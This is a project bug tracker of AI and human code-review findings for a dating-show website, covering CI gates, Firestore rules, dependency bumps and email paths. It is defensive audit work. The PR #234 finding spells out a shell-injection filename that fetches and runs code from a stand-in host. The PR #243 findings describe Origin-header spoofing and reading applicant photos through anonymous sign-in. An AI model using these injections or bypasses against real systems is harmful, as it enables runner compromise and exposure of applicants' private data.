- [ ] MEDIUM: [INCOMPLETE-PRICE-REMOVAL] Journal copy still states specific ticket prices | Why: PR #196 removed visible prices from UI surfaces on the grounds they drift from real Eventbrite pricing, but journal article copy (e.g. `src/data/journal/live-shows.ts:34` and `:906`) still names Garam Masala ticket prices that can go equally stale | Files: src/data/journal/live-shows.ts | Plan: audit journal and tips data for our own show's price mentions and replace stale exact figures with durable phrasing (content-only edit, city content enrichment rules apply, no deletions of surrounding copy) | Verify: grep journal data for dollar figures tied to Garam Masala shows and confirm none contradict events.ts. Executor: the 3:00 overnight fix-medium-bugs lane.
- WONTFIX(MEDIUM, 2026-08-18): [EVENT-SLUG-DATE-MISMATCH] The rescheduled Boston show's slug `boston-2026-08-02` keeps the original date while `isoDate` is 2026-08-13 | Reason: intentional slug stability. The slug is the published canonical URL and tracking id; regenerating it on a date change would 404 shared links and reset conversion attribution. The move is recorded the mandated way (`previousDate`, note, EVENTS-HISTORY.md) and the show has since passed. Recorded so the report is not re-filed.

### Codex (2026-08-18T16:11Z) — HIGH findings

Note (2026-08-19, PR #193 merge pass): this round's own [UNSUPPORTED-NODE-RANGE] finding is dropped here; main's engines.node commit (`a4e4226`) already fixed and deleted it. Split from a shared checkbox into one line per finding (Fable `[SHARED-CHECKBOX]`, 2026-08-19) so the overnight fixer's one-checkbox-per-finding parsing doesn't silently drop the co-listed items.

- [ ] HIGH: [UTC-CALENDAR-CUTOFF] `src/utils/eventDate.ts:107-111` uses the UTC calendar date, so `src/pages/api/go/[slug].ts:61` rejects same-day West Coast ticket purchases from 5 PM local time. Compare against the event timezone and end time.

### Codex (2026-08-18T16:11Z) — MEDIUM findings

Split from a shared checkbox into one line per finding, same pass as above (Fable `[SHARED-CHECKBOX]`, `[DUP-SECTION-HEADER]`, 2026-08-19).

- [ ] MEDIUM: [DELIVERY-FLAG-REGRESSION] `src/pages/api/sync-orders.ts:652-656` resets `purchaseCapiSent` to false before every upsert. When the optional CAPI token is absent, or the existing-state read fails, a previously delivered order is persisted as pending again.
- [ ] MEDIUM: [FALSE-PURCHASE-CONVERSION] `src/lib/eventbrite.ts:42-46` converts every unknown Eventbrite status to `placed`; the new branch at `src/pages/api/sync-orders.ts:677` then sends those orders to Meta as purchases. Unknown statuses must fail closed.
- [ ] MEDIUM: [HIDDEN-EVENT-INDEXING] `src/pages/events/[slug].astro:53-73` generates pages for hidden records and `astro.config.mjs:217-232` includes them in the sitemap. This publicly indexes records such as the hidden Chicago and Edison entries.
- [ ] MEDIUM: [TBA-SUPPRESSION] `src/data/events.ts:595-600` checks cancellation but not `hidden`, despite claiming to test displayability. A hidden future show suppresses its city's public notify card.
- [ ] MEDIUM: [WRONG-EVENT-TIMEZONE] `src/utils/eventSchema.ts:58-60` still applies New York offsets to every event, producing incorrect structured-data times for California and other non-New-York shows.

### Review lane finding filed on the primary checkout (2026-08-19)

- WONTFIX(HIGH, 2026-08-19): firestore.rules phone-update rule alleged to null-error and keep the "Firestore/Storage rules (emulator)" CI check red on main since 2026-06-17, blocking PRs from leaving draft | Reason: false positive AS FILED (a permanent red since June does not match reality: the check passed on PRs #203, #204, #205 and PR #203 merged 2026-08-19T17:07Z), but the underlying test proved intermittently flaky the same day; the reproduced intermittent failure is re-filed as the open FLAKY-PHONE-UPDATE-TEST entry below
- [ ] MEDIUM: [FLAKY-PHONE-UPDATE-TEST] "step-2 phone update may touch ONLY the phone field" (leads collection) fails intermittently in CI with PERMISSION_DENIED, passed unchanged on immediate rerun | Why: reproduced on PR #208 run 32290971770 (2026-08-19), a branch that touches neither the leads rules nor this test, then passed on rerun with zero diff; validPhoneUpdate() in firestore.rules reads resource.data via d.diff(prev), so a seedLead() write that is not yet visible to the rules evaluator under CI load would explain a transient null prev and PERMISSION_DENIED; the same run also logs a storage.rules line 41 "Property owner is undefined" evaluation warning worth checking in the same pass | Files: test/rules/public-write.rules-test.ts, firestore.rules | Plan: make the test await seed visibility (or retry the assertSucceeds once with backoff) only if investigation confirms the seed race; otherwise harden validPhoneUpdate() against missing resource.data and add a regression test that updates a just-created doc in a tight loop to reproduce | Verify: 20 consecutive CI runs of the rules job green, no PERMISSION_DENIED flakes in the run logs

### Codex (2026-08-19T18:58Z)

- [ ] HIGH: [FLAKY-LEADS-RULES-TEST] test/rules/public-write.rules-test.ts "leads: step-2 phone update may touch ONLY the phone field" failed then passed on identical code within 20 minutes (local emulator runs, 2026-08-19: deploy-rules run4 failed 1/34, run5 passed 34/34). A flaky rules test can block the gated rules-deploy lane at random. Files: test/rules/public-write.rules-test.ts, firestore.rules. Executor: the 3:00 overnight fixer.

### Codex (2026-08-19T19:00Z)

- [ ] HIGH: Make heartbeat delivery failure observable. (.github/workflows/synthetic-apply.yml:78-82)

### Codex (2026-08-19T19:00Z)

- [ ] MEDIUM: Do not describe the heartbeat as proof of alert delivery. (CHANGELOG.md:5-16)

- WONTFIX(MEDIUM, 2026-08-19): Trim optional text before deciding whether to include it (useApplyForm.ts payload builder) | Reason: every untrimmed inclusion check in buildApplicationData (country, state, community, income, howHeard) is a select or geo-dataset value that cannot contain whitespace; every free-text field (name, email, phone, height, instagram, referrerName, pitch, type) was already trimmed. The one real gap, city (free-text input) sent untrimmed, was fixed in the same session with city.trim().

### Claude (2026-09-15, investigating lead/phone_update PERMISSION_DENIED alert, leadId ug0C3suKM1ug9s05PWDt)

- [ ] HIGH: [LEAD-PHONE-UPDATE-PERMISSION-DENIED] `lead/phone_update` alerts recur in production (2026-09-05 and 2026-09-15 occurrences) with Firestore PERMISSION_DENIED and no root cause fixed yet | Why: the write path is `src/pages/api/update-lead.ts` doing a server-to-server Firestore REST PATCH (no client Auth/App Check token anywhere in this path, ruling out the previously-suspected WebView token-propagation theory), gated by `validLeadContactUpdate()` at `firestore.rules:161-170` (renamed from `validPhoneUpdate()` in PR #244). Leading hypothesis: a retried/duplicate update whose value already matches `resource.data` produces an empty `diff().affectedKeys()`, which `changed.size() > 0` at `firestore.rules:165` rejects; plausible because the client's dedupe ref in `useApplyForm.ts:517-525` only advances on a successful response and silently swallows failures at `useApplyForm.ts:526-528`, so a lost response triggers a same-value resend. Secondary hypothesis: the `leads/{doc}` does not exist yet at PATCH time and falls through to `validLead()`, which a phone-only payload can never satisfy. This session shipped a diagnostic-only fix (`update-lead.ts` now passes `fields: updateKeys.join(",")` into `alertOps` context) to confirm which hypothesis is right on the next occurrence, since the rules change itself must not be guessed at. | Files: firestore.rules, src/pages/api/update-lead.ts, test/rules/public-write.rules-test.ts | Plan: on the next `lead/phone_update` alert, check the new `fields` context value; if phone-only and the lead already has that phone value stored, harden `validLeadContactUpdate()` to tolerate a same-value resend (e.g. allow `changed.size() == 0` when the incoming value matches `resource.data`); if the doc is missing, fix whatever causes `leads/{id}` to not exist yet at token-issue time. Either way add a `seedLead()`-then-re-update-with-same-value case to `test/rules/public-write.rules-test.ts`, which currently never re-updates an existing value so this exact path has zero test coverage. | Verify: next occurrence's alert email shows `fields`; rules change (once the hypothesis is confirmed) has a passing regression test and the alert stops recurring

### Codex (2026-08-20T14:49Z)

- [ ] HIGH: Operator step 2 falsely expects an email after a successful manual monitor run. `.github/workflows/synthetic-apply.yml:71` sends a heartbeat only during Monday 13 UTC runs, while `src/pages/api/notify-application.ts:192` explicitly suppresses synthetic-submission emails. Most successful manual runs therefore produce no email and would falsely implicate alert delivery.

### Codex (2026-08-20T14:49Z)

- [ ] MEDIUM: [COPY-VOICE] Added prose violates the repository ban on em dashes in `.github/workflows/synthetic-apply.yml:49`, `src/components/apply/useApplyForm.ts:136`, `src/components/apply/useApplyForm.ts:177` and `test/rules/apply-flow.rules-test.ts:245`.
- [ ] MEDIUM: [SILENT-FAILURE] .github/workflows/synthetic-apply.yml:50, moving the drift check before the Playwright step means a drift failure now stops the job before the Playwright spec runs, and per BUGS.md that spec's failure path is what POSTs to /api/alert-failure; unless the workflow has an `if: always()` alert step outside this diff, the most likely outage class (stale rules — the exact Aug 12 scenario) fails CI with no immediate alert attempt and surfaces only via the absent Monday-13:30 heartbeat, up to ~7 days later. | Files: .github/workflows/synthetic-apply.yml BUGS.md | PR: #208 | Head: 112b1694598499bda676c576ac04eeb0a394324d

<!-- fable-routed PR #208 head 112b1694598499bda676c576ac04eeb0a394324d -->

- [ ] MEDIUM: [ALWAYS-RUNS-ON-CANCEL] .github/workflows/synthetic-apply.yml:62, `if: always()` (unlike `!cancelled()`) makes the verify/cleanup and rules-drift steps execute even on a cancelled run, so a run cancelled mid-flight (manually or via the `synthetic-apply` concurrency group) still performs its Firestore cleanup sweep and can delete the synthetic document a superseding run just created, making that run's verify step fail and fire a false page. | Files: .github/workflows/synthetic-apply.yml | PR: #207 | Head: 56f4a6e2a2ab4f28a568a9221bd072b9b7d73619
- [ ] MEDIUM: [OVERBROAD-CONTRACT] CHANGELOG.md:5, the claim "can no longer fail silently" is violated because both pager steps gate on `failure()`, which is false for cancelled runs, and no run fires at all if the scheduled workflow is auto-disabled after 60 days of repo inactivity or the runner is lost — leaving silent-death modes covered only by the weekly heartbeat over the site channel that is documented (FALSE-PAGER-SUCCESS) to swallow delivery failures. | Files: CHANGELOG.md | PR: #207 | Head: 56f4a6e2a2ab4f28a568a9221bd072b9b7d73619

<!-- fable-routed PR #207 head 56f4a6e2a2ab4f28a568a9221bd072b9b7d73619 -->

- [ ] HIGH: [CORRECTNESS] scripts/diff-coverage.mjs:79, the gate diffs base.sha against head.sha two-dot instead of using the merge-base (three-dot), so whenever the PR branch and main have diverged — e.g. a stale branch, or this very PR's "merged main after a month" scenario — lines authored on main are counted as the PR's changed lines, and if any are under-covered the required check fails a PR for code it never touched. | Files: base.sha e.g head.sha scripts/diff-coverage.mjs | PR: #160 | Head: c251ea7abaa5a9862f3477db86cf0f37d27695f8
- [ ] MEDIUM: [FALSE-BLOCK] scripts/diff-coverage.mjs:55, coveredLinesFor marks lines covered only when they fall inside an executed statement range, so added lines that are comments, blank lines, interfaces, or type-only declarations can never be covered; a comment-only or types-only edit to a tracked src file computes 0% patch coverage and fails the required check. | Files: scripts/diff-coverage.mjs | PR: #160 | Head: c251ea7abaa5a9862f3477db86cf0f37d27695f8
- [ ] MEDIUM: [CI-BREAK] .github/workflows/ci.yml:63, the job now runs `npm run test:coverage` but no hunk in this diff adds a `test:coverage` script to package.json, so unless that script already exists on main, every run of the required "Lint, Types, Test, Build" job fails immediately with "Missing script". | Files: .github/workflows/ci.yml package.json | PR: #160 | Head: c251ea7abaa5a9862f3477db86cf0f37d27695f8

<!-- fable-routed PR #160 head c251ea7abaa5a9862f3477db86cf0f37d27695f8 -->

- [ ] MEDIUM: [contract-violation] src/lib/portalBootstrap.ts:215, `isDefinitiveRejection` only recognizes a 2xx body with `state:"error"` as definitive, so a stored context whose link dies via a non-2xx status (e.g. the 404 "Invalid invite link." shape the mapping tests model) or resolves to `state:"expired"` is never cleared — every subsequent visit that session replays the dead link and the visitor can never reach the bare/open portal or the cookie-authed branch, contradicting the changelog's "clears on definitive server rejection" claim. | Files: e.g src/lib/portalBootstrap.ts | PR: #147 | Head: 177c6e2f7a0aaca2ca43f31a74aa6d20a59ff829

<!-- fable-routed PR #147 head 177c6e2f7a0aaca2ca43f31a74aa6d20a59ff829 -->

- [ ] MEDIUM: [missing-asset] src/pages/journal/index.astro:80, the new cupid section references /images/ai-art/cupid-garden.webp but this PR adds no image file, so if that file is not already in the deployed public/images/ai-art/ folder the request 404s and the journal page renders a bordered ~200px broken-image block; failure scenario: a visitor opens /journal and sees an empty gray box with a broken-image icon where the artwork should be, with no build-time error to catch it since the src is a plain string. | Files: images/ai-art/cupid-garden.webp src/pages/journal/index.astro | PR: #146 | Head: 81273d0b35ae67a94a9e2956218c866c07685707

<!-- fable-routed PR #146 head 81273d0b35ae67a94a9e2956218c866c07685707 -->

- [ ] HIGH: [DEPLOY-ORDER] src/lib/verifyToken.ts:110, the new `email_verified === true` requirement takes effect the moment this merges and auto-deploys, but nothing in the repo or CI enforces the documented precondition that `npm run admin:verify-emails` printed safe first — if the real admin accounts are still unverified (the script's own comment says password accounts "stay unverified forever" without this one-time flip), every admin API route returns 401 again, recreating the exact outage this PR fixes. | Files: src/lib/verifyToken.ts | PR: #145 | Head: a7c96eeb700313f56cfbf3a7c2063ac4e4defcf3
- [ ] MEDIUM: [DRIFT-GUARD-GAP] src/lib/verifyToken.test.ts:349, the code comments claim the drift tests hold the full predicate copies together, but the tests only guard the email list and the `email_verified` conjunct — a future edit that drops the anonymous-provider check or loosens `admin == true` in firestore.rules or storage.rules passes the gate while the rules silently diverge from the API, potentially leaving Firestore-direct access weaker than the API path. | Files: firestore.rules src/lib/verifyToken.test.ts storage.rules | PR: #145 | Head: a7c96eeb700313f56cfbf3a7c2063ac4e4defcf3

<!-- fable-routed PR #145 head a7c96eeb700313f56cfbf3a7c2063ac4e4defcf3 -->

- [ ] MEDIUM: [DATA-LOSS] ENHANCEMENTS.md:649, the deleted "Prefetch/preload key pages + skeleton loaders" (Priority: High) and the 13-item "Full-site CLS audit" carry no Fixed/shipped status and no CHANGELOG.md entry appears in this diff, violating the PR's own new rule that only shipped items are deleted — if the apply-page skeleton and scroll-lock fixes were never built, the open work is silently dropped with no surviving record and never gets scheduled. | Files: CHANGELOG.md ENHANCEMENTS.md | PR: #139 | Head: 4db91e278d8c9077471bd056160c2d57390339c7
- [ ] MEDIUM: [DATA-LOSS] ENHANCEMENTS.md:749, the "International phone input with country selector" item is an explicitly deferred item ("Later Later", with its documented why-not-now reasoning), which the new routing header says must stay in the file, yet it is deleted outright — when international texting via Twilio/MessageBird starts, no record of the required per-country validation work exists and malformed numbers get texted. | Files: ENHANCEMENTS.md | PR: #139 | Head: 4db91e278d8c9077471bd056160c2d57390339c7
- [ ] MEDIUM: [DATA-LOSS] ENHANCEMENTS.md:228, the "Geo fetch race condition in bootstrapGeoData()" item is deleted on the strength of "Status: Fixed in feat/wave2-conversion", a feature branch rather than a main-line commit — if that branch was never merged, users who submit a lead form within ~200ms of page load still write Firestore leads with all six geo fields missing, and the detailed six-step implementation plan needed to fix it is gone. | Files: ENHANCEMENTS.md | PR: #139 | Head: 4db91e278d8c9077471bd056160c2d57390339c7

<!-- fable-routed PR #139 head 4db91e278d8c9077471bd056160c2d57390339c7 -->

- [ ] HIGH: [PEER-CONFLICT] package.json:73, @stryker-mutator/vitest-runner 10.0.0 declares a strict peer dependency on @stryker-mutator/core 10.0.0 while this PR leaves core at ^9.6.1, so `npm ci`/`npm install` will fail with ERESOLVE (or, if forced past it, Stryker will crash at runtime on mismatched plugin APIs) if this PR merges alone — it is only safe merged together with or after PR #212 (core 10.0.0) and alongside #214 (jest-runner 10.0.0). | Files: package.json | PR: #213 | Head: 68d78b2b00f057fda4ac4596449cac1941b325b1
- [ ] MEDIUM: [ENGINE-BUMP] package-lock.json:6092, the runner's engines requirement jumps from node >=14.18.0 to >=22.0.0, so any CI job or local machine still on Node 18/20 will fail installs run with engine-strict or fail silently at runtime when the mutation-test job executes on the older runtime. | Files: package-lock.json | PR: #213 | Head: 68d78b2b00f057fda4ac4596449cac1941b325b1
- [ ] MEDIUM: [SPLIT-TREE] package-lock.json:6100, the lockfile now nests @stryker-mutator/api and util 10.0.0 under vitest-runner while core 9.6.1 keeps api 9.6.1 at the root, and Stryker resolves plugins through core's API surface, so even an install forced with --legacy-peer-deps yields two incompatible API copies and mutation runs error out or report nonsense instead of failing loudly at install time. | Files: package-lock.json | PR: #213 | Head: 68d78b2b00f057fda4ac4596449cac1941b325b1

<!-- fable-routed PR #213 head 68d78b2b00f057fda4ac4596449cac1941b325b1 -->

- [ ] MEDIUM: [lockfile] package-lock.json:20411, the regenerated lockfile relocates the @typescript-eslint/* packages (parser, eslint-plugin, typescript-estree, utils, type-utils, project-service, tsconfig-utils) from top-level node_modules into folders nested under node_modules/typescript-eslint — a layout a clean regeneration would not produce with no version conflict present (peer `>=4.8.4 <6.1.0` is satisfied by 6.0.3), suggesting the lockfile still carries resolution state from the failed TS 7 attempt despite the CHANGELOG claiming "Lockfile regenerated"; concretely, after `npm ci` any eslint config, editor plugin, or script that resolves `@typescript-eslint/parser` or `@typescript-eslint/eslint-plugin` directly from the project root (rather than through the `typescript-eslint` meta-package) fails with MODULE_NOT_FOUND and the lint CI leg goes red or silently skips. | Files: package-lock.json | PR: #134 | Head: 5da61cf89e4daf2e275c9a7e9ad2485635a6bf92

<!-- fable-routed PR #134 head 5da61cf89e4daf2e275c9a7e9ad2485635a6bf92 -->

### Codex (2026-09-02T09:25Z)

- [ ] HIGH: [NON-BLOCKING-RULES-GATE] The "Protect Main" ruleset in GitHub Settings still requires `Lint, Types, Test, Build` only, so the `Firestore/Storage rules (emulator)` job runs on every PR, can show a red X, and the merge goes through anyway. That job is the only gate on `firestore.rules`/`storage.rules`, whose mismatch took the apply form down for a week in July 2026. | Why still open (2026-09-02): the ruleset lives in GitHub, not in this repo, and no file change can reach it. `scripts/setup-branch-protection.sh` is the API form of the same list but is commented out in full (branch protection on a private repo needs GitHub Pro), so it enforces nothing either. What the 2026-09-02 pass did fix is the drift that hid the gap: `ci.yml`, `setup-branch-protection.sh` and `docs/security/REMEDIATION.md` now name both checks, `test/required-checks.test.ts` fails when those three drift apart, and all three say in writing that the second check is not live yet. | Fix: on GitHub, Settings, then Rules, then "Protect Main", under "Require status checks to pass" add a second check named exactly `Firestore/Storage rules (emulator)` (copy the string; the parentheses and spacing must match the `name:` in `ci.yml` character for character). | Verify: open any PR and the merge box lists two required checks, not one; a PR that breaks `firestore.rules` cannot be merged.
- WON'T FIX (decision, 2026-09-02): [SCOPE-CREEP] Codex read `test/required-checks.test.ts` as inventing a repo-wide policy (every CI job required, no conditional jobs) beyond the one finding, and asked for the two names to be pinned without it. Declined, and recording it so the same report is not re-filed: the policy is the owner's and predates the test. `.github/workflows/ci.yml` has carried it since 2026-07-14 ("Full CI now runs on EVERY PR by owner decision: no conditional skips and no success reported without the checks actually running"), after `paths-ignore: **.md` deadlocked every docs-only PR on a required check that never reported (PR #139). The test asserts that existing decision in the two files that can drift from it; the "no job-level `if:`" assertion is what makes "require every job" safe, since a job that can decline to report is exactly the PR #139 deadlock. It also does not outlaw advisory jobs: it makes one cost a deliberate edit to `test/required-checks.test.ts` that records which job does not gate and why, instead of a job that is advisory because nobody noticed, which is the absence the original bug was made of. The narrower alternative (pin two strings, ignore job three) is the same shape as the bug being fixed here, so it is not the safer option. The allowlist that sentence asked for now exists rather than being promised: `ADVISORY_JOBS` in `test/required-checks.test.ts`, empty today, one entry per job that deliberately does not gate, with the reason required. Declaring a job advisory is a one-line edit; forgetting to require one still fails the suite.
- [ ] HIGH: Weekly Smoke Tests workflow failed ten weeks running with no alert | Why: a red scheduled run pages nobody, so stale tests and any real production regression went unseen | Files: .github/workflows/smoke-tests.yml | Plan: add an `if: failure()` step that pages the owner through the existing pager path (check scripts/ for the pager the monitors use) and name the failing run URL | Verify: dispatch the workflow with a deliberately failing grep and confirm the page arrives
- [ ] MEDIUM: Homepage accessibility smoke check flakes on ipad-landscape | Why: axe reports frame-title and image-alt on third party injected frames and images (TikTok pixel) that appear only sometimes, so the test passes or fails on timing | Files: tests/smoke/site.spec.ts | Plan: exclude third party iframes and pixel images from the axe scan (axe `exclude` on those selectors) instead of retrying | Verify: run the Homepage case 20 times on ipad-landscape with zero failures
- [ ] HIGH: [DEPS] package.json:74, Bumping @stryker-mutator/jest-runner to 10.0.0 while @stryker-mutator/core stays at ^9.6.1 violates the runner's exact peerDependency on core 10.0.0, so a fresh `npm ci`/`npm install` will fail with an ERESOLVE conflict (or, if forced past it, Stryker will refuse to load the plugin), breaking CI installs and mutation testing until PR #212 (core 10.0.0) is merged and the lockfiles are regenerated together. | Files: package.json | PR: #214 | Head: 7bba5264084b80c69448bdecd2cca30c3881c2ab
- [ ] MEDIUM: [COMPAT] package-lock.json:6053, The new runner and its bundled @stryker-mutator/api raise the engines requirement from Node >=20 to Node >=22, so any CI job or local environment pinned to Node 20 will emit EBADENGINE warnings and can fail at runtime on Node-22-only APIs even though Node 20 worked yesterday. | Files: package-lock.json | PR: #214 | Head: 7bba5264084b80c69448bdecd2cca30c3881c2ab

<!-- fable-routed PR #214 head 7bba5264084b80c69448bdecd2cca30c3881c2ab -->

- [ ] HIGH: [DEPS] package.json:75, this PR bumps @stryker-mutator/vitest-runner to 10.0.0 whose peerDependencies require @stryker-mutator/core exactly 10.0.0, but core stays at ^9.6.1 in this diff, so merging PR #213 alone (without #212) makes `npm ci`/`npm install` fail with an ERESOLVE peer-dependency conflict or leaves a runner whose plugin API (nested @stryker-mutator/api 10.0.0) mismatches core 9.6.1 at runtime, crashing mutation-test runs. | Files: package.json | PR: #213 | Head: 68d78b2b00f057fda4ac4596449cac1941b325b1
- [ ] MEDIUM: [DEPS] package-lock.json:6092, the engines requirement jumps from node >=14.18.0 to node >=22.0.0, so any CI job or developer machine on Node 18/20 that currently installs cleanly will start failing engine checks or hit runtime errors when Stryker runs. | Files: package-lock.json | PR: #213 | Head: 68d78b2b00f057fda4ac4596449cac1941b325b1

<!-- fable-routed PR #213 head 68d78b2b00f057fda4ac4596449cac1941b325b1 -->

- [ ] HIGH: [COMPAT] package.json:73, this PR upgrades @stryker-mutator/core to 10.0.0 while @stryker-mutator/jest-runner and @stryker-mutator/vitest-runner stay at 9.6.1, a cross-major plugin/API mismatch; if this merges before PRs #213/#214, the next `stryker run` (or any CI job invoking it) aborts at startup with a plugin-version/peer-dependency error, and a fresh `npm install` (not `npm ci`) can fail ERESOLVE on the runners' peer range. | Files: package.json | PR: #212 | Head: f6704cc7f8f6f6c265647c0c3dd0f74a43182252
- [ ] MEDIUM: [ENV] package-lock.json:6046, @stryker-mutator/core 10.0.0 raises its engine floor to Node >=22 and its bundled Babel 8 toolchain requires `^22.18.0 || >=24.11.0`; any CI runner or local machine on Node 20 (or Node 22 earlier than 22.18) will get engine warnings on install and can crash at runtime when the instrumenter loads Babel 8, since nothing in this PR verifies or bumps the project's Node version. | Files: package-lock.json | PR: #212 | Head: f6704cc7f8f6f6c265647c0c3dd0f74a43182252

<!-- fable-routed PR #212 head f6704cc7f8f6f6c265647c0c3dd0f74a43182252 -->

- [ ] HIGH: [SECURITY] scripts/diff-coverage.mjs:151, the changed-file path parsed out of the PR's diff is interpolated unescaped into a shell command (`sh(\`git show ${headSha}:${file}\`)`), so a pull request that adds a file with a crafted name such as `src/x;curl evil.sh|sh;.ts`(a legal git filename that still matches the enforced`src/**/*.ts` set) executes arbitrary commands on the CI runner, the same runner whose workflows hold Firebase admin credentials. | Files: evil.sh scripts/diff-coverage.mjs | PR: #234 | Head: 6dfd21c44f456e926e18475aed25b504d88819b6
- [ ] MEDIUM: [CORRECTNESS] scripts/diff-coverage.mjs:98, `rescueContinuationLines` is a single ascending pass that only rescues a line when `line + 1` is already in the covered set, so an opener whose next line is a comment/blank line (e.g. `const cfg =` followed by `// see docs` then the covered initializer) or another not-yet-rescued continuation line stays "uncovered," and the gate re-blocks a well-tested PR with the exact false 80%-threshold failure this change claims to have fixed. | Files: e.g scripts/diff-coverage.mjs | PR: #234 | Head: 6dfd21c44f456e926e18475aed25b504d88819b6
- [ ] MEDIUM: [SILENT-FAILURE] public/js/posthog.js:30, classifying any error whose message contains "must be an instance of WebGLShader" as `third_party_error` also swallows the identical first-party TypeError that this repo's own `public/js/shader-app.js` produces whenever a null shader reaches any `gl.*` call path other than the one just guarded, so a future real WebGL regression on the site stops filing GitHub issues and is silently invisible in error tracking. | Files: public/js/posthog.js public/js/shader-app.js | PR: #234 | Head: 6dfd21c44f456e926e18475aed25b504d88819b6

<!-- fable-routed PR #234 head 6dfd21c44f456e926e18475aed25b504d88819b6 -->

- [ ] HIGH: [BUILD] src/pages/api/cron/followups.ts:13, multiple files now import `jsonResponse` from `@/lib/http` and `BRAND_LOGO_URL` from `@/data/brand` but neither module is created anywhere in this diff, so if those files were forgotten in the commit (the pattern of this PR is to add new shared modules like `src/lib/cronAuth.ts`, which IS present) every page and API route that imports them fails to compile and the deploy breaks. | Files: src/lib/cronAuth.ts src/pages/api/cron/followups.ts | PR: #123 | Head: 0674aa103c7808e575e755311072fdc815d3e6ec
- [ ] MEDIUM: [DATA-LOSS] src/pages/api/cron/post-show.ts:62, the loop now catches Firestore write failures and continues instead of aborting, so during a Firestore outage the cron emails every eligible contestant but marks none of them as sent, and the next run re-sends the post-show email to all of them (old behavior stopped after the first failure, limiting duplicates to one recipient). | Files: src/pages/api/cron/post-show.ts | PR: #123 | Head: 0674aa103c7808e575e755311072fdc815d3e6ec
- [ ] MEDIUM: [SILENT-FAILURE] src/data/sponsorship.ts:7, the sponsorship contact was swapped from caleb@garammasaladating.com to contact@garammasaladating.com with no evidence that mailbox/alias exists, so if it isn't provisioned every sponsor inquiry from the live site bounces or disappears with no error visible to anyone. | Files: garammasaladating.com src/data/sponsorship.ts | PR: #123 | Head: 0674aa103c7808e575e755311072fdc815d3e6ec
- [ ] MEDIUM: [BUILD] src/lib/schemas.ts:66, `UpdateLeadSchema`/`UpdatePayload`, `EMAIL_FROM` (file deleted), and `getFirebaseProjectId` are removed without this diff showing removal of their consumers, so if any endpoint (e.g. a lead-update route) or `zohoMailer` still references them the build fails or a live API route starts throwing at runtime. | Files: e.g src/lib/schemas.ts | PR: #123 | Head: 0674aa103c7808e575e755311072fdc815d3e6ec
- [ ] MEDIUM: [DEP] package.json:51, `country-state-city` is dropped from dependencies while `formatLocation`/`locationDisplay` consumers in the admin components are untouched in this diff, so if that util still imports the package the admin dashboard fails to build or crashes when rendering applicant locations. | Files: package.json | PR: #123 | Head: 0674aa103c7808e575e755311072fdc815d3e6ec

<!-- fable-routed PR #123 head 0674aa103c7808e575e755311072fdc815d3e6ec -->

- [ ] MEDIUM: [silent-failure] src/data/emails.ts:83, `fillTemplate()` leaves any unmatched `{{token}}` intact in the output with no error or log, so a typo introduced in a JSON copy file (e.g. renaming `{{firstName}}` to `{{first_name}}` in applicant-welcome.json) ships literal `{{first_name}}` in the greeting of every welcome email sent, and with src/data/** excluded from test coverage nothing catches it before real applicants receive it. | Files: applicant-welcome.json e.g src/data/emails.ts | PR: #236 | Head: 2b3a91e58902101ad894b733e0c85fb19daf23d9

<!-- fable-routed PR #236 head 2b3a91e58902101ad894b733e0c85fb19daf23d9 -->

- [ ] MEDIUM: [availability] src/pages/api/capture-lead.ts:230, the new producer notification is awaited inline before the signup response, using the sendMail this same PR documents in BUGS.md as having no bounded SMTP timeout, so once NOTIFICATION_EMAIL is set a hung Zoho connection stalls every lead signup until the platform kills the function — the user sees a timeout/error even though their signup already succeeded in Kit, and even the happy path now adds a full SMTP round trip of latency to every signup. | Files: BUGS.md src/pages/api/capture-lead.ts | PR: #230 | Head: c39ab6f345b7be7c2fc8859928d77f8815dfd979

<!-- fable-routed PR #230 head c39ab6f345b7be7c2fc8859928d77f8815dfd979 -->

- [ ] HIGH: [security] src/pages/api/notify-application.ts:129, the Vercel preview allowlist regex `^https:\/\/[\w-]+-hellosurbhi\.vercel\.app$` matches any attacker-created Vercel project deliberately named with a `-hellosurbhi` suffix (e.g. `evil-hellosurbhi.vercel.app`), and the Origin header itself is freely settable by any non-browser client, so a scripted attacker sends `Origin: https://garammasaladating.com` with curl and the guard passes, leaving the Resend email endpoint as abusable as before. | Files: e.g evil-hellosurbhi.vercel.app garammasaladating.com src/pages/api/notify-application.ts | PR: #243 | Head: 877aa7a1137f0f582c1b247c7ffaefdada5126d1
- [ ] HIGH: [security] storage.rules:6, `allow read: if request.auth != null` is presented as restricting applicant photos to the admin dashboard, but the apply flow depends on `signInAnonymously()` so anonymous auth is enabled project-wide; anyone can call `signInAnonymously()` from any Firebase client using the public config and enumerate/read every applicant photo, making the privacy hardening ineffective while the comment claims admin-only access. | Files: request.auth storage.rules | PR: #243 | Head: 877aa7a1137f0f582c1b247c7ffaefdada5126d1
- [ ] MEDIUM: [silent-failure] src/pages/api/notify-application.ts:127, the allowlist accepts only the bare apex domain, so a legitimate submission whose Origin is `https://www.garammasaladating.com` or the Vercel production alias (e.g. `garam-website.vercel.app`, which lacks the `-hellosurbhi` suffix) gets a 403 after the application has already been written to Firestore, meaning the applicant record exists but the producer notification email is silently never sent. | Files: e.g garam-website.vercel.app src/pages/api/notify-application.ts www.garammasaladating.com | PR: #243 | Head: 877aa7a1137f0f582c1b247c7ffaefdada5126d1
- [ ] MEDIUM: [data-loss] .gitignore:15, adding `.env`/`.env.*`/`docs/private/` to .gitignore and deleting BUGS.md does not untrack already-committed files or scrub git history, so if this PR chain culminates in making the repo public, any previously committed env file (the old .gitignore never ignored `.env`) plus the deleted BUGS.md — which documents still-open exploitable holes like `allow create: if true` on the applications collection — remain fully readable in history. | Files: BUGS.md | PR: #243 | Head: 877aa7a1137f0f582c1b247c7ffaefdada5126d1

<!-- fable-routed PR #243 head 877aa7a1137f0f582c1b247c7ffaefdada5126d1 -->

- [ ] MEDIUM: [vacuous-test] test/ops-alert.test.ts:73, the two truncation-ordering tests ("redacts before the 2000-char bound" and "drops the token its input ceiling cuts through") place the cut a few characters past the `@` and assert only `not.toContain("@")`, so both stay green if `buildWebhookBody` regresses to slice-before-redact or `boundRedactionInput`'s trailing-token drop is deleted — the dangerous fragment is a cut landing before the `@` (a bare "priya" with no `@` left), which satisfies the no-`@` assertion while still naming the applicant; concretely, reorder `redactEmails(...).slice(0, MAX_ERROR_CHARS)` to slice-then-redact and the full suite passes while a cron summary cut mid-address publishes the local part to the public ntfy topic. | Files: not.toContain test/ops-alert.test.ts | PR: #254 | Head: 0bc5a4024c98e48404a3dce84bc430a50140f7ba

<!-- fable-routed PR #254 head 0bc5a4024c98e48404a3dce84bc430a50140f7ba -->

